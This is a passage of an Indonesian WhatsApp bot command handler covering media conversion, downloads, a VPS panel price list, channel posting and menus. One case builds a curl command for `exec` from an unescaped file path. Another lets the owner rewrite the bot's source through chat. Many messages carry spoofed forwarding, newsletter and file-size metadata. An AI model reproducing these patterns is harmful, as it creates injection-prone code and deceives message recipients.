6Yt8xOSYgD7jgfsp4clhpGbD1avI2LHI9qOTmERFydBERAEREAREQBDyXBOFHX68Utmt8lVWPDWtHAd7j4AL1rVcuy3ip45yNTFy4IYtQ3ymsdA+pq34A+Vo5uPgFWcu0+6ueTHTUzWZ4A5JwtX1Nfqq/3B1RUuxGDiOLuYP5US1rnuDWAucTgAcytbQ2aKOPaqExcvkZeru0kj9mnXBPUtnR2vai7XUUVfBGwvaSx8foM4KrrVFQavUVxmJzmZw+gOPwrB0fpgWK1z3e5jFUInFrD/AI24+6qt73SPc9/zOJcfcldW1kG9SOp07KIiePPDyObg+bdo2zrqqqvhy9zDynH/ACasqzUlE+r+O9gP+3jdKfbgPysHMK016K5WpyJTmqjUd19i29n16bRaGqZ5cuFE5+Wjv7/yoJ+0+6ueTHTUrW54A5OFn2TfCq4LrbahofFK0OLT35GD9lrus9MT6erOAc+ikP8ATk8PQ+qzsNPSrWSRTp2lXFPHUuyzVKUkcsK6ImC+Ghumltoz6yvbTXeOKFshwyRnAZ8DlWS1wcAQQQfBeX1ZmzrWhjMVsur8jPZhld9j/K/K6WhGJm06ac09zu23RXrlTrr19i1kXy14cARyK+lnDQBERAEREBgrZ201NJM/5Y2lx9gvP+qtQVOoLg6aYlsDTiKLuaPE+q9B1EbZY3MkGWuBBHoqP11pKWxVJqKVpfb5DwI/x+h9PAq3YnwtnVJO8vD51I15ZM6JMvu8/nQ1FWvs40c2Bkd0uTA6Zw7UMZ4hg8T6qqVvuz3WLrfIy3XJ+aVxxHI4/wBv0Pp9ldvDJ3QYQePXAj2t0LZ0WXw6Ym+bQ6rdNJ1zuRe34Y/7cPyqFVu7X6xosVLCxwImlB4d4AJ/hVEvmsEexTq/qvofve5NqZG9E9Te9mlt32kvTnsy0w/CB9wc/haKQWkgjBHNXLsmpPh6YfK4Y+PK4/Tl+FVuqKYUmobhCBgNmcQPQ8R913Q1G3WTs+aaHNbBsUkL/mupObK6n4GqmMJwJo3M9zz/AJVyXS309zo301XGJInjBBVA6Un3bUlulzjEwHXh+VeGpL/TWK3GpqHAuIxGwHi8+AUu9xO3tqs4qif7qUbPK3dnI/giqUtq7T02nriYXO7cD8uif348D6qC5cQpC93aqvVe+qq3kuPytHJg8AulDE+eVkULC+R5Aa0cyVpqdJGwpnr2sNTOzrG6VclOzyLX2X6omr82utLnyxM7Uch5loOMH14hWQtK2faTbY6feqrDq+ZoDvBg8At1WHr3QuncsHdNlRNlbCiTd4IiL4z6wiIgCwV1LFWU0kFRG2SJ4wWuGQVnREVU1QcShtb6UmsFWZIQ6SgkP6H+Q+BWrL0zX0UFdSyU9TG18UgwQVoE2y2idI90ddUMYTwbgHH1wtRQ3tiR7FTxTn1M5WWdyv24OC8uhV9fdKqqpKSmqJC+KnJDO1zGf/F1ipDUlsjtd8qKKKZ0scJA7RAyTjP5XXt0BqbhSwAZMkrWY9zhXInxpFmMTBvH3I0rXrJlv1dw9i/dH0u6aaoISMOEQJ9yFVW1Wl+Bql7wMCaNr/c8v4V1U8YigY3ytAVZ7aKXBt1SBx7Toz9RkfZZG0zLvqOX6sfPU1FzhTdFan04fj0KwEjoXskj/uNcC33UjfLtVXms3irfnAwxnc0eAUa9oc0g8FYOltBU17ssFa6umjc/Ic1rRgEHC1NXNBTKk03Hgi4YmbpoZqhFhi+664cDQY2OlkayJpdI44aAMklXJs+0c21RsrbgwOrnjIB4iMeHuu5pjQtBZKreS99TOPldJj9PsFt4aByCzl0u28JlQ93n/f6L9utmQuZLq70/ZyOCIihlkIiIAiIgCIiALG/PZPssi4IQKeb9ROldfbgZ2lsnx38CO7PD9lKbO6M1mq6P9JcyLMjuHLAOP3Kueu0/bK6YzVVDBLKebnMBKz260UNt7W40sUPa5ljQMrQPvTXU2Q1uuGHlgQ2WhzajOV2mOPud3GQtO2pURqtLzPa0ufC4SDA5ceP7ZW54XxJG2RjmPaHNIwQe9Q4JVhkbInFCvNEksasXmeYMq5tkTpTpxzZGERtmd2Ce8c89crYHaUsrnFxttNk8T/TClqamjpomxQRsjjbya0YAVe43dtXFltbhriS6C2OpZcxzsTK3vXKBFDLIREXoCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIo/fZPKzoU32Tys6FASCKP32Tys6FN9k8rOhQEgij99k8rOhTfZPKzoUBIIo/fZPKzoU32Tys6FASCKP32Tys6FN9k8rOhQEgij99k8rOhTfZPKzoUBIIo/fZPKzoU32Tys6FASCKP32Tys6FN9k8rOhQEgij99k8rOhTfZPKzoUB//2Q==",
	"caption": "no cap, no pretending, no need a mentions"
}
}), { userJid: m.chat, quoted: m })
cay.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
}
break

case "sad1":
 case "sad2":
 case "sad3":
 case "sad4":
 case "sad5":
 case "sad6":
 case "sad7":
 case "sad8":
 case "sad9":
 case "sad10":
 case "sad11":
 case "sad12":
 case "sad13":
 case "sad14":
 case "sad15":
 case "sad16":
 case "sad17":
 case "sad18":
 case "sad19":
 case "sad20":
 case "sad21":
 case "sad22":
 case "sad23":
 case "sad24":
 case "sad25":
 case "sad26":
 case "sad27":
 case "sad28":
 case "sad29":
 case "sad30":
 case "sad31":
 case "sad32":
 case "sad33":
 case "sad34":
 case "sad35":
const moai0 = await getBuffer(
`https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
 );
cay.sendMessage(
m.chat,
 {
audio: moai0,
mimetype: "audio/mp4",
ptt: true,
 },
{ quoted: m }
 );
break

case "facebook": case "fb": {
if (!text.includes("facebook.com")) return m.reply("Masukan link facebook!")
try {
 axios({ "method": "GET", "url": "https://mannoffc-x.hf.space/download/facebook", "params": { "url": text }}).then(_ => {
 cay.sendMessage(m.chat, { video: { url: _.data.result.video }, caption: "Ini dia kak" }, { quoted: m })
 })
} catch ({ message }) {
 m.reply(message)
}
}
break

case 'tomp4': case 'tovideo': {
if (!quoted) reply `Balas sticker video Dengan Caption ${prefix + command}`
if (/video/.test(mime)) {
let { TelegraPh } = require('../all/uploader')
let media = await cay.downloadAndSaveMediaMessage(quoted)
let ehe = await TelegraPh(media)
await cay.sendMessage(from, { video: { url: util.format(ehe), caption: 'Convert Webp To Video' } }, {quoted: qkontak})
await fs.unlinkSync(media)
}
}
break
/*case 'tovideo':
if (isQuotedSticker) return reply(`Reply stikernya!`);
var stream = await baileys.downloadContentFromMessage(
m.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage,"sticker"
);
 var buffer = Buffer.from([]);
 for await (const chunk of stream) {
 buffer = Buffer.concat([buffer, chunk]);
 }
 var rand1 = "sampah/" + getRandom(".webp");
 var rand2 = "sampah/" + getRandom(".png");
 fs.writeFileSync(`./${rand1}`, buffer);
 if (
 isQuotedSticker &&
 m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage
 .isAnimated !== true
 ) {
 exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
 fs.unlinkSync(`./${rand1}`);
 if (err) return reply("Status: 0");
 cay.sendMessage(
 from,
 { image: { url: `./${rand2}` } },
 { quoted: m }
 );
 fs.unlinkSync(`./${rand2}`);
 });
 } else {
 reply(mess.wait);
 webp2mp4File(`./${rand1}`).then((data) => {
 fs.unlinkSync(`./${rand1}`);
 cay.sendMessage(
 from,
 { video: { url: data.result } },
 { quoted: m }
 );
 });
 }
 break;*/
case 'tovn':{
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
cay.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio':{
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
cay.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'tomp3': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
cay.sendMessage(from, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{ externalAdReply: { showAdAttribution: false,
mediaType: 1,
mediaUrl: 'https://youtube.com/@-',
title: `Converter mp3`,
sourceUrl: `${global.saluran}`,
thumbnail: ppuser
}
}})
}
break
//=================================================//
case 'togif': {
//if (!isRegistered) return registerbut(noregis)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./lib/uploader')
let media = await cay.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await cay.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
 }
break
//=================================================//
/*case 'tourl': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await cay.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break*/
case 'toqr':{
//if (!isRegistered) return registerbut(noregis)
if (!q) return reply('Masukin Link Atau Text (´-﹏-`；)')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await cay.sendMessage(from, { image: medi, caption:"Ini Diahh (￣ヘ￣;)"}, { quoted: m })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}
break

case 'toanime': {
 async function uploadUguu(filePath) {
 const { exec } = require('child_process');
 return new Promise((resolve, reject) => {
 exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (error, stdout) => {
 if (error) return reject('Gagal mengunggah ke Uguu');
 try {
 let jsonResponse = JSON.parse(stdout);
 resolve({ status: 'Done', result: jsonResponse.files[0].url });
 } catch (err) {
 reject('Gagal mengunggah ke Uguu');
 }
 });
 });
 }
if (!quoted) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
reply(msg.wait);
let media = await cay.downloadAndSaveMediaMessage(quoted);
let uploadResult = await uploadUguu(media); 
if (uploadResult.status !== 'Done') {
return reply('Gagal mengunggah gambar.');
}
let cdn = uploadResult.result;
let imge; 
try {
imge = `https://api.zenkey.my.id/api/maker/toanime?apikey=zenkey&url=${cdn}`;
} catch (error) {
console.error('Error fetching from API:', error);
return m.reply('Terjadi kesalahan saat mengambil data dari API.');
}
cay.sendMessage(m.chat, { image: { url: imge }, caption: 'Done' }, { quoted: m });
}
break

case 'listram': case 'listpanel': case 'panel':{
//if (!isRegistered) return registerbut(noregis)
let u = ` ⟣────────────`
let list1 = `• *${monospa('Paket [ 1 ]')}* 📦

> _RAM 4 GB_
> _DIKS 4190_
> _CPU 350%_
> _4K BULAN_`
let list2 = `• *${monospa('Paket [ 2 ]')}* 📦

> _RAM 5 GB_
> _DIKS 5190_
> _CPU 450%_
> _5K BULAN_`
let list3 = `• *${monospa('Paket [ 3 ]')}* 📦

> _RAM 6 GB_
> _DIKS 6190_
> _CPU 550%_
> _6K BULAN_`
let list4 = `• *${monospa('Paket [ 4 ]')}* 📦

> _RAM 7 GB_
> _DIKS 7190_
> _CPU 650%_
> _7K BULAN_ `
let list5 = `• *${monospa('Paket [ 5 ]')}* 📦

> _RAM 8 GB_
> _DIKS 8190_
> _CPU ∞%_
> _9K BULAN_`
let list6 = `• *${monospa('Paket [ 6 ]')}* 📦

> _RAM 9 GB_
> _DIKS O190_
> _CPU ∞%_
> _10K BULAN_`
let list7 = `• *${monospa('Paket [ 7 ]')}* 📦

> _RAM ∞ GB_
> _DIKS ∞_
> _CPU ∞%_
> _12K BULAN_`
let mmm = `
◦ Ram Vps : 16gb
◦ Core Vps : 4
◦ Garansi : 30 Day
◦ Terawat : ✓
◦ Anti Maling : ✓`
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '0@newsletter',
			newsletterName: 'Hutao Only', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Hutao -CMD', 
 thumbnailUrl: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: 'List Panel',
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list1}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"bayar4gb\"}`

}
 ]
 })
 },
 // BATAS CLONE KODE
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list2}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"bayar5gb\"}`

}
 ]
 })
 },
 // BATAS CLONE KODE
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list3}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"bayar6gb\"}`
 
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list4}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\".bayar7gb\"}`
 
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list5}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"bayar8gb\"}`
 
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list6}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"bayar9gb\"}`
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list7}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"bayarunli\"}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

/*case"chat":{
if (!text) return m.reply("teks?")
cay.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
cay.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
cay.sendMessage(`${global.idch}`, {text:`${text}`}, {quoted: m})
mentionedJid: [m.sender],
 

}, 
forwardedNewsletterMessageInfo: {
newsletterName: `pesan dari: ${pushname}`,
newsletterJid: "120363357312070270@newsletter"}
}},{quoted: m})
await sleep(2000)
cay.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break*/

			
/*contextInfo: {
      mentionedJid: [m.sender, owned],
      forwardingScore: 999,
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true, 
        title: `👋🏻 Hai ${pushname}`,
        body: `powered by ${namaowner}`,
        thumbnailUrl: thumb,
        sourceUrl: "https://whatsapp.com/channel/0029VaimJO0E50UaXv9Z1J0L",
        mediaType: 1,
        renderLargerThumbnail:false
          }
   })*/
 
case "toki":
case "teksup":{
    if (!isOwner) return reply(`khusus owner dan premium`)
    if (!text) return m.reply("teks?")
    const owned111 = owner + "@s.whatsapp.net"
let awal = `anjir`
cay.sendMessage(`120363357312070270@newsletter`,{ text: `${text}`,
 contextInfo: {
 mentionedJid: [m.sender, owned111],
             forwardedNewsletterMessageInfo: {
                newsletterJid: `120363357312070270@newsletter`,
               newsletterName: `.`,
                serverMessageId: -1
            },

 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: {
 showAdAttribution: true, 
 title: `pesan dari dits`,
 body: `user: ${isCreator ? 'creator' : isPremium ? 'premium' : 'free'}`,
 thumbnailUrl: thumb,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
cay.sendMessage(m.chat, { audio: b, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
break

case "upteks":
case "chat":{
    if (!text) return m.reply("teks?")
    const owned11 = owner + "@s.whatsapp.net"
let awal = `anjir`
cay.sendMessage(`${global.idch}`,{ text: `${text}`,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
             forwardedNewsletterMessageInfo: {
                newsletterJid: `120363357312070270@newsletter`,
               newsletterName: `+${m.sender.split('@')[0]}`,
                serverMessageId: -1
            },

 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: {
 showAdAttribution: true, 
 title: `pesan dari: ${pushname}`,
 body: `user: ${isCreator ? 'creator' : isPremium ? 'premium' : 'free'}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
cay.sendMessage(m.chat, { audio: b, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
break

case 'o10':{
reply(`${metadata.subject}`)
}
break

case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let { TelegraPh } = require('../all/uploader.js')
let media = await cay.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
reply(util.format(anu))
await fs.unlinkSync(media)
}
break
case 'addcase': {
    if (!isOwner) return reply(msg.owner)
    if (!text) return reply('Mana case nya');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = './hutao.js';



// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break
  case 'listcase': case 'listfitur':{
const listCase = () => {
const code = fs.readFileSync("./setting/hutao.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Case*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "╰◈ ${prefix}" + x + "\n"
})
return teks
}
reply(listCase())
}
break
case 'delcase': {
 if (!isCreator) return reply('Hanya creator yang bisa menghapus case.');
 if (!text) return reply('Mana case yang ingin dihapus?');

 // Nama file yang akan dimodifikasi
 const namaFile = './Hayo NGAPAIN';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return reply('Terjadi kesalahan saat membaca file.');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return reply(`Case '${args}' tidak ditemukan dalam file.`);
 }

 // Cari posisi break; berikutnya setelah case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return reply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.');
 }

 // Potong data untuk menghapus case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('Terjadi kesalahan saat menulis file:', err);
 return reply('Terjadi kesalahan saat menulis file.');
 } else {
 return reply(`Case '${text}' berhasil dihapus.`);
 }
 });
 });
    }
 break;
case "downloadmenu":{
let menu = `
┏ ⪻ 𝐃𝐨𝐰𝐧 𝐌𝐞𝐧𝐮 ≫
╰◈ ${prefix}igdl
╰◈ ${prefix}gdrive
╰◈ ${prefix}igmp4
╰◈ ${prefix}tiktok
╰◈ ${prefix}tt2
┗──≫
`
cay.sendMessage(m.chat, {
text: menu,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: namabot,
newsletterJid: idsaluran,
},
externalAdReply: {
title: namabot,
body: namaowner,
thumbnailUrl: thumb,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})
}
break

case "stikermenu":
case "menustiker":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ stiker menu≫*┈─⊡
╰◈ ${prefix}sticker
╰◈ ${prefix}cls
╰◈ ${prefix}smeme
╰◈ ${prefix}qc
╰◈ ${prefix}qc2
╰◈ ${prefix}smeta
╰◈ ${prefix}stickhandhold
╰◈ ${prefix}stickshinobu
╰◈ ${prefix}stickcuddle
╰◈ ${prefix}stickhighfive
╰◈ ${prefix}stickdance
╰◈ ${prefix}stickcringe
╰◈ ${prefix}stickhappy
╰◈ ${prefix}stickglomp
╰◈ ${prefix}sticksmug
╰◈ ${prefix}stickblush
╰◈ ${prefix}stickawoo
╰◈ ${prefix}stickwave
╰◈ ${prefix}sticksmile
╰◈ ${prefix}stickslap
╰◈ ${prefix}stickpoke
╰◈ ${prefix}stickwink
╰◈ ${prefix}stickbonk
╰◈ ${prefix}stickbully
╰◈ ${prefix}stickyeet
╰◈ ${prefix}stickbike
╰◈ ${prefix}stickkiss
╰◈ ${prefix}sticklick
╰◈ ${prefix}stickpat
╰◈ ${prefix}stickhug
╰◈ ${prefix}stickkill
╰◈ ${prefix}stickcry
╰◈ ${prefix}stickspank
╰◈ ${prefix}sticktickle
╰◈ ${prefix}kill
╰◈ ${prefix}handhold
╰◈ ${prefix}highfive
╰◈ ${prefix}cringe
╰◈ ${prefix}dance
╰◈ ${prefix}happy
╰◈ ${prefix}smug
╰◈ ${prefix}glomp
╰◈ ${prefix}wave
╰◈ ${prefix}blush
╰◈ ${prefix}slap
╰◈ ${prefix}smile
╰◈ ${prefix}poke
╰◈ ${prefix}nom
╰◈ ${prefix}wink
╰◈ ${prefix}yeet
╰◈ ${prefix}bite
╰◈ ${prefix}bonk
╰◈ ${prefix}lick
╰◈ ${prefix}pat
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/menuawal.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: fkontak})
}
break

case "aimenu":
case "menuai":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ aimenu ≫*┈─⊡
╰◈ ${prefix}turbo
╰◈ ${prefix}txt2img
╰◈ ${prefix}morphic
╰◈ ${prefix}aio2
╰◈ ${prefix}ai
╰◈ ${prefix}gpt4
╰◈ ${prefix}autoai (*BEST SELECT*)
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb4,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
